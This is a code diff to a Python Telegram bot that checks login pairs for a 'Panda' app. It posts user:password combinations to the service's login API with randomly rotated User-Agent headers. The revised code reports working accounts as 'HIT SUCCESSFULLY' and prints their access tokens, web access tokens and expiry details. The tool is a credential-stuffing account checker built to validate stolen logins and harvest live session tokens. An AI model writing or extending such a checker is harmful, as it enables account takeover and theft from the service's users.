@@ -1,22 +1,20 @@
 import requests
 import time
-import json
-from telebot import TeleBot
+import random
 
-def get_random_ua():
-    user_agents = [
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/18.18363",
-        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36"
-    ]
-    return user_agents[randint(0, len(user_agents) - 1)]
+# User-Agent strings for random selection
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36"
+]
 
 def process_panda_command(bot, message):
     chat_id = message.chat.id
@@ -38,43 +36,50 @@ def process_panda_command(bot, message):
             )
 
     else:
-        bot.send_message(chat_id, "Please provide account details in the format: /panda email:password")
+        bot.send_message(chat_id, "Please provide account details in the format: /panda user:password")
 
 def check_panda_account(account):
-    email, password = account.split(':')
+    user, password = account.split(':')
     login_url = "https://api.iajee.com/api/v2/users/app/login"
     headers = {
-        "User-Agent": get_random_ua(),
+        "User-Agent": random.choice(USER_AGENTS),
         "Content-Type": "application/json",
-        "api-version": "v2.0",
-        "Accept-Language": "en-US",
-        "app-version-num": "66",
-        "product-identifier": "Panda",
-        "Connection": "Keep-Alive"
+        "Accept": "application/json",
+        "Connection": "keep-alive"
     }
-    data = json.dumps({
-        "account": email,
+    data = {
+        "account": user,
         "clientVersion": "6.3.0",
         "deviceName": "WIN-HPLUP5LK692-winnt-10.0.19041",
-        "deviceToken": "random_device_token",
+        "deviceToken": "<RANDOM_DEVICE_TOKEN>",
         "deviceType": "WINDOWS",
         "password": password
-    })
+    }
 
-    response = requests.post(login_url, headers=headers, data=data)
+    response = requests.post(login_url, headers=headers, json=data)
     
     if response.status_code == 200:
-        response_data = response.json()
-        if "accessToken" in response_data:
-            expiration = response_data.get("expires_at", "N/A")
-            left_days = response_data.get("leftDays", "N/A")
-            return (f"Valid ✅\n"
-                    f"Expires At: {expiration}\n"
-                    f"Left Days: {left_days}")
+        response_json = response.json()
+        access_token = response_json.get("accessToken", "")
+        web_access_token = response_json.get("webAccessToken", "")
+        if access_token and web_access_token:
+            account_creation_date = response_json.get("registerAt", "Unknown")
+            max_devices = response_json.get("maxDeviceCount", "Unknown")
+            left_days = response_json.get("leftDays", 0)
+            if left_days > 0:
+                expiry_date = response_json.get("dueTime", "Unknown")
+                return (f"HIT SUCCESSFULLY\n"
+                        f"Access Token: {access_token}\n"
+                        f"Web Access Token: {web_access_token}\n"
+                        f"Account Creation Date: {account_creation_date}\n"
+                        f"Max Devices: {max_devices}\n"
+                        f"Expiry Date: {expiry_date}")
+            else:
+                return "Account Expired❌"
         else:
-            return "Invalid Credentials🚫"
+            return "Invalid Credentials❌"
     else:
-        return "Invalid Credentials🚫"
+        return "Invalid Credentials❌"
 
 def get_footer_info(total_accounts, start_time, username):
     elapsed_time = time.time() - start_time
